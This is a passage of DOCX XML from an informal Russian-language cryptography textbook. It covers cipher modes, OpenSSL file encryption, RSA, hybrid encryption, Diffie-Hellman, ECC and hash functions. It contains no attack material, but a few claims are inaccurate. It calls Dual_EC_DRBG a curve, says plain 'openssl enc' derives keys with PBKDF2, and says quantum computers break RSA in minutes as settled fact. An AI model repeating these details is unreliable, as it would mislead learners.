        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Одинаковые блоки → разный шифротекст</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Простой</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Медленный (нельзя распараллелить шифрование)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уязвим к **padding oracle атакам** (если неправильно реализован)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. CTR (Counter Mode) — лучше</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Шифруем </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>счётчик</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (counter), потом XOR'им с текстом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>C[0] = P[0] ⊕ AES(IV + 0)</w:t>
        <w:br/>
        <w:t>C[1] = P[1] ⊕ AES(IV + 1)</w:t>
        <w:br/>
        <w:t>C[2] = P[2] ⊕ AES(IV + 2)</w:t>
        <w:br/>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>⚡ Быстро (можно распараллелить на GPU/многоядерных процессорах)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Можно расшифровать отдельный блок (не нужно расшифровывать всё с начала)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если повторно использовать IV с тем же ключом — **пиздец**. Шифротекст можно XOR'нуть и получить открытый текст.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. GCM (Galois/Counter Mode) — best choice</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">CTR + </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>аутентификация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (проверка целостности). Добавляет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>тег</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (MAC — Message Authentication Code), чтобы детектить изменения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>⚡ Быстро (аппаратное ускорение)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>🛡️ Защита от изменения данных (integrity)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Рекомендуется NIST, используется в TLS 1.3</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется</w:t>
      </w:r>
      <w:r>
        <w:t>: HTTPS (TLS 1.2/1.3), SSH, IPsec VPN, Wi-Fi WPA3.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: шифрование файла с помощью AES (OpenSSL)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Шифрование файла (AES-256-CBC)</w:t>
        <w:br/>
        <w:t>openssl enc -aes-256-cbc -salt -in secret.txt -out secret.txt.enc</w:t>
        <w:br/>
        <w:br/>
        <w:t># Расшифрование</w:t>
        <w:br/>
        <w:t>openssl enc -d -aes-256-cbc -in secret.txt.enc -out secret.txt</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что происходит</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>OpenSSL запрашивает пароль</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Генерирует 256-битный ключ из пароля (с помощью **KDF** — Key Derivation Function, обычно PBKDF2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Шифрует файл с помощью AES-256-CBC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сохраняет зашифрованный файл</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно</w:t>
      </w:r>
      <w:r>
        <w:t>: если потеряешь пароль — всё, файл не восстановить. Даже NSA не поможет (ну, наверное 😏).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.2.3. Асимметричное шифрование: два ключа — больше магии</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Асимметричное шифрование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это когда есть </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>два разных ключа</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Публичный ключ** (public key) — можно дать кому угодно, используется для **шифрования**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Приватный ключ** (private key) — хранишь только у себя, используется для **расшифрования**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия</w:t>
      </w:r>
      <w:r>
        <w:t>: Публичный ключ — это адрес твоего почтового ящика. Любой может кинуть туда письмо (зашифровать сообщение). Но открыть ящик может только тот, у кого есть ключ (приватный).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Решена проблема распределения ключей**: публичный ключ можно отправлять по незащищённому каналу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Цифровая подпись**: можешь доказать, что сообщение отправил именно ты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>🐌 **Медленно** (в 100-1000 раз медленнее симметричного)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>🔑 **Длинные ключи** (RSA-2048 = 2048 бит = 256 байт)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>RSA (Rivest-Shamir-Adleman)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Год</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 1977  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Авторы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Ron Rivest, Adi Shamir, Leonard Adleman (MIT)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Длина ключа</w:t>
      </w:r>
      <w:r>
        <w:t>: 1024, 2048, 3072, 4096 бит (рекомендуется 2048+)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (на пальцах):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Генерация ключей**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выбираем два больших простых числа p и q (например, по 1024 бита)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Считаем n = p × q (это модуль, 2048 бит)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выбираем e (обычно 65537)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Считаем d (приватный ключ) через расширенный алгоритм Евклида</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Публичный ключ**: (e, n)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Приватный ключ**: (d, n)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифрование**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   C = M^e mod n</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   где M — исходное сообщение (число), C — шифротекст</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расшифрование**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   M = C^d mod n</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему это безопасно?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Чтобы взломать RSA, нужно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>разложить n на множители</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (p и q). Если n = 2048 бит, это займёт миллиарды лет на современных компьютерах (но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>квантовый компьютер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> разложит за минуты — алгоритм Шора).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: RSA </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>медленный</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Шифровать большой файл (100 Мб) на RSA — это пытка. Поэтому в реальности используют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>гибридное шифрование</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Гибридное шифрование (так работает HTTPS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Генерируем случайный симметричный ключ** (например, AES-256, 256 бит = 32 байта)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифруем файл на AES** (быстро)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифруем ключ AES на RSA** (медленно, но ключ маленький — 32 байта)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Отправляем** зашифрованный файл + зашифрованный ключ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расшифрование</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расшифровываем ключ AES** с помощью приватного ключа RSA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расшифровываем файл** с помощью AES</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: HTTPS (TLS handshake), SSH, PGP/GPG.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Diffie-Hellman (обмен ключами)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Год</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 1976  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Авторы</w:t>
      </w:r>
      <w:r>
        <w:t>: Whitfield Diffie, Martin Hellman</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: как двум людям договориться об общем секретном ключе по незащищённому каналу (где кто-то подслушивает)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия с красками</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Алиса и Боб договариваются о **публичном цвете** (например, жёлтый). Это знает весь мир.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Алиса выбирает **свой секретный цвет** (например, красный), смешивает с жёлтым → получается оранжевый. Отправляет Бобу.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Боб выбирает **свой секретный цвет** (например, синий), смешивает с жёлтым → получается зелёный. Отправляет Алисе.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Алиса берёт зелёный (от Боба) и добавляет свой красный → получается коричневый.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Боб берёт оранжевый (от Алисы) и добавляет свой синий → получается тот же коричневый.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат</w:t>
      </w:r>
      <w:r>
        <w:t>: У Алисы и Боба одинаковый коричневый цвет (общий секрет), а подслушиватель знает только жёлтый, оранжевый, зелёный — но не может восстановить коричневый (потому что не знает красный и синий).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В математике</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>g = 5 (публичное число)</w:t>
        <w:br/>
        <w:t>p = 23 (публичное простое число)</w:t>
        <w:br/>
        <w:br/>
        <w:t>Алиса: выбирает a = 6 (секрет)</w:t>
        <w:br/>
        <w:t xml:space="preserve">       A = g^a mod p = 5^6 mod 23 = 8 (публичный)</w:t>
        <w:br/>
        <w:t xml:space="preserve">       отправляет A Бобу</w:t>
        <w:br/>
        <w:br/>
        <w:t>Боб:   выбирает b = 15 (секрет)</w:t>
        <w:br/>
        <w:t xml:space="preserve">       B = g^b mod p = 5^15 mod 23 = 19 (публичный)</w:t>
        <w:br/>
        <w:t xml:space="preserve">       отправляет B Алисе</w:t>
        <w:br/>
        <w:br/>
        <w:t>Алиса: s = B^a mod p = 19^6 mod 23 = 2 (общий секрет)</w:t>
        <w:br/>
        <w:t>Боб:   s = A^b mod p = 8^15 mod 23 = 2 (общий секрет)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Атака</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Man-in-the-Middle</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (MITM). Если Ева (атакующая) может перехватывать и подменять сообщения, она может притвориться Бобом для Алисы и Алисой для Боба. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>: использовать сертификаты (PKI) для проверки подлинности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>ECC (Elliptic Curve Cryptography)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Год</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 1985 (Koblitz, Miller)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Популярность</w:t>
      </w:r>
      <w:r>
        <w:t>: с 2010-х (iPhone, Bitcoin, современные VPN)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: вместо больших простых чисел (RSA) используем </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>эллиптические кривые</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> над конечными полями.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Короткие ключи**: ECC-256 эквивалентен RSA-3072 по стойкости, но в 12 раз короче</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Быстрее** (меньше вычислений)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Меньше памяти** (важно для IoT, смартфонов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>⚠️ Сложнее реализовать (больше шансов на ошибку)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>⚠️ Некоторые кривые слабые (backdoor от NSA? Слухи о кривой Dual_EC_DRBG)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Bitcoin, Ethereum (ECDSA для подписей транзакций)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TLS 1.3 (ECDHE — Elliptic Curve Diffie-Hellman Ephemeral)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SSH (ed25519)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Apple iMessage, Signal (end-to-end шифрование)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Bitcoin использует кривую </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>secp256k1</w:t>
      </w:r>
      <w:r>
        <w:t>. Приватный ключ — 256 бит (32 байта), публичный ключ — 33 байта (сжатый) или 65 байт (несжатый).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.2.4. Хэш-функции: односторонняя улица</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Хэш-функция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это функция, которая:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Принимает данные любой длины** (1 байт или 1 терабайт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Выдаёт фиксированную длину** (например, 256 бит для SHA-256)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Односторонняя**: невозможно восстановить исходный текст из хэша</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Детерминированная**: одинаковый вход → одинаковый выход</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия</w:t>
      </w:r>
      <w:r>
        <w:t>: Блендер. Кидаешь фрукты (текст), получаешь смузи (хэш). Из смузи обратно фрукты не восстановишь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем нужны хэш-функции?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Хранение паролей** (храним хэш пароля, а не сам пароль)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Проверка целостности файлов** (скачал ISO-образ Ubuntu — проверь SHA-256, чтобы убедиться, что его не подменили)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Цифровые подписи** (подписываем хэш документа, а не весь документ)</w:t>
      </w:r>
    </w:p>
